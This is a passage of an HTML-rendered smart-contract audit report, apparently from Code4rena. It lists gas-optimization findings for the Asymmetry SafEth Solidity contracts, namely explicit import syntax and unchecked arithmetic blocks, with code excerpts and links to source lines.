href=\"#proof-of-concept-26\" aria-label=\"proof of concept 26 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof Of Concept</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"134\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">name</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L50\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L50</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"135\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ethPerDerivative</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L211\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L211</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"136\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">balance</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L221\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L221</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"137\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">name</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L44\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L44</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"138\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ethPerDerivative</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L111\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L111</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"139\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">balance</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L122\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L122</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"140\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">name</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L41\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L41</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"141\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ethPerDerivative</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L86\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L86</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"142\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">balance</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L93\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L93</a></p>\n<h2 id=\"g-10-non-usage-of-specific-imports\" style=\"position:relative;\"><a href=\"#g-10-non-usage-of-specific-imports\" aria-label=\"g 10 non usage of specific imports permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-10] Non-usage of specific imports</h2>\n<p>The current form of relative path import is not recommended for use because it can unpredictably pollute the namespace.<br>\nInstead, the Solidity docs recommend specifying imported symbols explicitly.<br>\n<a href=\"https://docs.soliditylang.org/en/v0.8.15/layout-of-source-files.html#importing-other-source-files\">https://docs.soliditylang.org/en/v0.8.15/layout-of-source-files.html#importing-other-source-files</a></p>\n<p>A good example:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"143\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">OwnableUpgradeable</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;openzeppelin-contracts-upgradeable/contracts/access/OwnableUpgradeable.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">SafeTransferLib</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;solmate/utils/SafeTransferLib.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">SafeCastLib</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;solmate/utils/SafeCastLib.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;solmate/tokens/ERC20.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">IProducer</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;src/interfaces/IProducer.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">GlobalState</span><span class=\"mtk1\">, </span><span class=\"mtk12\">UserState</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;src/Common.sol&quot;</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<h3 id=\"proof-of-concept-27\" style=\"position:relative;\"><a href=\"#proof-of-concept-27\" aria-label=\"proof of concept 27 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof Of Concept</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"144\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">5</span><span class=\"mtk1\">: </span><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../interfaces/IWETH.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">6</span><span class=\"mtk1\">: </span><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../interfaces/uniswap/ISwapRouter.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">7</span><span class=\"mtk1\">: </span><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../interfaces/lido/IWStETH.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">8</span><span class=\"mtk1\">: </span><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../interfaces/lido/IstETH.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">10</span><span class=\"mtk1\">: </span><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;./SafEthStorage.sol&quot;</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L5\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L5</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L6\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L6</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L7\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L7</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L8\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L8</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L10\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L10</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"145\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">4</span><span class=\"mtk1\">: </span><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../../interfaces/IDerivative.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">5</span><span class=\"mtk1\">: </span><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../../interfaces/frax/IsFrxEth.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">7</span><span class=\"mtk1\">: </span><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../../interfaces/rocketpool/RocketStorageInterface.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">8</span><span class=\"mtk1\">: </span><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../../interfaces/rocketpool/RocketTokenRETHInterface.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">9</span><span class=\"mtk1\">: </span><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../../interfaces/rocketpool/RocketDepositPoolInterface.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">10</span><span class=\"mtk1\">: </span><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../../interfaces/rocketpool/RocketDAOProtocolSettingsDepositInterface.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">11</span><span class=\"mtk1\">: </span><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../../interfaces/IWETH.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">12</span><span class=\"mtk1\">: </span><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../../interfaces/uniswap/ISwapRouter.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">14</span><span class=\"mtk1\">: </span><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../../interfaces/uniswap/IUniswapV3Factory.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">15</span><span class=\"mtk1\">: </span><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../../interfaces/uniswap/IUniswapV3Pool.sol&quot;</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L4\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L4</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L5\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L5</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L7\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L7</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L8\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L8</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L9\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L9</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L10\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L10</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L11\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L11</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L12\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L12</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L14\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L14</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L15\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/Reth.sol#L15</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"146\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">4</span><span class=\"mtk1\">: </span><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../../interfaces/IDerivative.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">5</span><span class=\"mtk1\">: </span><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../../interfaces/frax/IsFrxEth.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">8</span><span class=\"mtk1\">: </span><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../../interfaces/curve/IFrxEthEthPool.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">9</span><span class=\"mtk1\">: </span><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../../interfaces/frax/IFrxETHMinter.sol&quot;</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L4\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L4</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L5\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L5</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L8\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L8</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L9\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/SfrxEth.sol#L9</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"147\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">4</span><span class=\"mtk1\">: </span><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../../interfaces/IDerivative.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">7</span><span class=\"mtk1\">: </span><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../../interfaces/curve/IStEthEthPool.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">8</span><span class=\"mtk1\">: </span><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../../interfaces/lido/IWStETH.sol&quot;</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L4\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L4</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L7\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L7</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L8\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/derivatives/WstEth.sol#L8</a></p>\n<h3 id=\"recommended-mitigation-steps-20\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-20\" aria-label=\"recommended mitigation steps 20 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Use specific imports syntax per solidity docs recommendation.</p>\n<h2 id=\"g-11-using-unchecked-blocks-to-save-gas\" style=\"position:relative;\"><a href=\"#g-11-using-unchecked-blocks-to-save-gas\" aria-label=\"g 11 using unchecked blocks to save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-11] Using <code>unchecked</code> blocks to save gas</h2>\n<p>Solidity version 0.8+ comes with implicit overflow and underflow checks on unsigned integers. When an overflow or an underflow isnâ€™t possible (as an example, when a comparison is made before the arithmetic operation), some gas can be saved by using an <code>unchecked</code> block.</p>\n<h3 id=\"proof-of-concept-28\" style=\"position:relative;\"><a href=\"#proof-of-concept-28\" aria-label=\"proof of concept 28 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof Of Concept</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"148\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">122</span><span class=\"mtk1\">: </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethAmountToWithdraw</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ethAmountAfter</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">ethAmountBefore</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L122\">https://github.com/code-423n4/2023-03-asymmetry/tree/main/contracts/SafEth/SafEth.sol#L122</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"149\"><code 